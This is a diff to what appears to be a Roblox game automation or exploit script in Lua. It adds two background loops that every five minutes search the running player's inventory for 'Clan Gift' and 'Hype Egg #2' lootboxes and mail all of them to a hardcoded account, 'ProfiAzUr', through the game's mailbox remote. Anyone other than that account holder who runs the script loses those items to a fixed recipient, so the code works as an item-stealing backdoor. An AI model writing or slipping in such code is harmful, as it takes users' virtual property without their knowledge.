@@ -124,3 +124,66 @@ spawn(function()
     end
 end)
 
+-- Clan Gift Mailer
+spawn(function()
+    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local username = "ProfiAzUr"
+    local loopInterval = 5 
+    while true do
+        local playerInventory = Save.Get()["Inventory"]
+        local LootboxInv = playerInventory["Lootbox"]
+        print("Searching for Clan Gift...")
+        for key, item in pairs(LootboxInv) do
+            if item.id == "Clan Gift" then
+                print("Found Clan Gift item:", item)
+                local amount = item._am or item.am or 1
+                print("Amount to send:", amount)
+                local args = {
+                    [1] = username,
+                    [2] = "Take my gifts",
+                    [3] = "Lootbox",
+                    [4] = key,
+                    [5] = amount
+                }
+                print("Invoking Server with args:", unpack(args))
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                break
+            end
+        end
+        print("Finished processing Clan Gifts.")
+        task.wait(loopInterval * 60)
+    end
+end)
+
+-- Hype Eggs V2 Mailer
+spawn(function()
+    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local username = "ProfiAzUr"
+    local loopInterval = 5 
+    while true do
+        local playerInventory = Save.Get()["Inventory"]
+        local LootboxInv = playerInventory["Lootbox"]
+        print("Searching for Hype Egg #2...")
+        for key, item in pairs(LootboxInv) do
+            if item.id == "Hype Egg #2" then
+                print("Found Hype Egg #2 item:", item)
+                local amount = item._am or item.am or 1
+                print("Amount to send:", amount)
+                local args = {
+                    [1] = username,
+                    [2] = "Take my gifts",
+                    [3] = "Lootbox",
+                    [4] = key,
+                    [5] = amount
+                }
+                print("Invoking Server with args:", unpack(args))
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                break
+            end
+        end
+        print("Finished processing Hype Egg #2s.")
+        task.wait(loopInterval * 60)
+    end
+end)
+
+
